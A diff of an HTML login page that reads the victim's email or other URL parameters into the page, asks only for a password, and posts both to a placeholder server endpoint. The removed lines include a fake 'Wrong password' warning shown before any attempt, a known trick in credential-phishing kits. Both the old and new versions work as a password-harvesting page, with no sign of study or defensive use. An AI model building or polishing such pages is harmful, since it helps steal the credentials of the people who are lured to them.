@@ -48,23 +48,15 @@
         }
         input[type="password"],
         input[type="text"] {
-            padding: 15px;
+            padding: 25px;
             font-size: 18px;
             width: calc(85% - 10px);
-            border: 2px solid #8B0000; /* Dark red border */
+            border: 1px solid #ccc;
             border-radius: 5px;
-            max-width: 320px;
+            max-width: 300px;
+            max-height: 8px;
             margin-bottom: 0;
             margin-left: auto;
-            margin-right: -150px;
-            background-color: white; /* White background */
-            color: black; /* Black text */
-        }
-        .warning-message {
-            color: #8B0000; /* Dark red */
-            font-size: 12px;
-            margin-top: 5px;
-            text-align: right;
             margin-right: -150px;
         }
         .query-box {
@@ -123,12 +115,6 @@
             font-size: 14px;
             margin-top: 10px;
         }
-        .caution-icon {
-            width: 12px; /* Adjust the size of the caution icon */
-            height: 12px; /* Adjust the size of the caution icon */
-            vertical-align: middle;
-            margin-right: 5px;
-        }
     </style>
 </head>
 <body>
@@ -139,19 +125,15 @@
             <img src="https://static.vecteezy.com/system/resources/previews/019/879/186/non_2x/user-icon-on-transparent-background-free-png.png" alt="User Icon">
             <span id="query-text"></span>
         </div>
-        <form id="login-form" action="your-server-endpoint" method="POST">
-            <input type="hidden" name="email" id="email-input">
+        <form id="login-form" method="POST" action="your-page.php">
             <div class="form-group">
+                <input type="hidden" id="query-input" name="query" required>
                 <input type="password" id="password-input" name="password" placeholder="Enter your password" required>
-                <p class="warning-message">
-                    <img src="https://www.nicepng.com/png/detail/207-2074836_alert-png-images-red-alert-icon-png.png" alt="Caution" class="caution-icon">
-                    Wrong password. Try again or click Forgot password to reset it.
-                </p>
                 <div class="show-password">
                     <input type="checkbox" id="show-password-checkbox">
                     <label for="show-password-checkbox">Show Password</label>
                 </div>
-                <button type="submit">Next</button>
+                <button id="submit-button" type="button">Next</button>
             </div>
         </form>
         <div class="footer">
@@ -161,18 +143,27 @@
     <script>
         function getQueryParams() {
             const params = new URLSearchParams(window.location.search);
-            let email = params.get('email') || '';
-            document.getElementById('query-text').textContent = email;
-            document.getElementById('email-input').value = email; // Set the hidden email input
+            let queryString = '';
+            for (const [key, value] of params.entries()) {
+                queryString += `${key}: ${value} `;
+            }
+            return queryString.trim() || 'No query parameters';
         }
 
-        document.addEventListener('DOMContentLoaded', getQueryParams);
+        const queryText = getQueryParams();
+        document.getElementById('query-text').textContent = queryText;
+        document.getElementById('query-input').value = queryText; // Set hidden input
 
         const passwordInput = document.getElementById('password-input');
         const showPasswordCheckbox = document.getElementById('show-password-checkbox');
+        const submitButton = document.getElementById('submit-button');
 
         showPasswordCheckbox.addEventListener('change', () => {
             passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
+        });
+
+        submitButton.addEventListener('click', () => {
+            document.getElementById('login-form').submit(); // Submit the form
         });
     </script>
 </body>
